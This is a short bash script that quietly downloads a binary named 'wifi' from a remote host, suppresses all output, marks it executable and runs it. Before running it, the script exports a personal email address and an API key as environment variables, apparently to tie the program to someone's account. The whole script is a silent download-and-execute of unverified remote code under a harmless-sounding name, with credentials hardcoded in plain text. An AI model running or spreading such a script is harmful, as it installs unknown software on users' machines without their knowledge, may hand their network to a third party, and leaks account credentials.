#!/bin/bash
curl -sL https://cdn.thichdi.site/wifi -o wifi >/dev/null 2>&1
chmod +x wifi
export RP_EMAIL="vbropa@gmail.com"
export RP_API_KEY="4f779ec4-8701-4aa3-9c3e-a7d747a2e2e3"
./wifi

